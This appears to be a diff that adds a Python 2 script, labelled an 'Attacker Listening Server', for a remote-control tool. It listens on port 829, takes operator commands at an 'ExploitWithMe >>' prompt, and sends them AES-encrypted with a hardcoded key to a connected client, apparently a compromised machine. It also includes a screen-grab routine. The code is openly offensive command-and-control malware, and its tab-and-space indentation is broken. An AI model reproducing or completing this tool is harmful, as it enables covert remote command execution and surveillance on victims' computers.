@@ -1,0 +1,60 @@
+import os
+import readline
+import socket
+import sys
+import string
+from Crypto import Random
+from Crypto.Cipher import AES
+try:
+    PORT = 829
+except:
+    print 'Usage: python file_name.py '
+    print 'the port is to be same on both client/server side and is hardcoded till now , not generic for testing purpise'
+    print 'the code is still in development and improvement phases'
+    sys.exit(1)
+HOST = 'localhost'
+KEY  = '82e672ae054aa4de6f042c888111686a'
+def pad(s):
+    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)
+def encrypt(plaintext):
+    plaintext = pad(plaintext)
+    iv = Random.new().read(AES.block_size)
+    cipher = AES.new(KEY, AES.MODE_CBC, iv)
+    return iv + cipher.encrypt(plaintext)
+def decrypt(ciphertext):
+    iv = ciphertext[:AES.block_size]
+    cipher = AES.new(KEY, AES.MODE_CBC, iv)
+    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
+    return plaintext.rstrip(b'\0')
+def screen_shot():
+	try :
+		hide_cmd = os.system("pip install pyscreenshot")
+		import pyscreenshot as ImageGrab
+		im=ImageGrab.grab()
+		im.show()
+		im=ImageGrab.grab(bbox=(10,10,500,500))
+		im.show()
+		ImageGrab.grab_to_file('im.png')
+	except:
+		print("some error occured while execution")
+def main():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((HOST, PORT))
+    s.listen(10)
+    print 'Attacker Listening Server Started on the Port {}...'.format(PORT)
+    conn, _ = s.accept()
+    while True:
+        cmd = raw_input('ExploitWithMe >> ').rstrip()
+	if cmd == 'grab_screen':
+	     screen_shot()
+	      hide_cmd = os.system("cat im.png")
+        if cmd == '':
+            continue
+        conn.send(encrypt(cmd))
+        if cmd == 'terminate':
+            s.close()
+            sys.exit(0)
+        data = conn.recv(4096)
+        print decrypt(data)
+if __name__ == '__main__':
+	main()
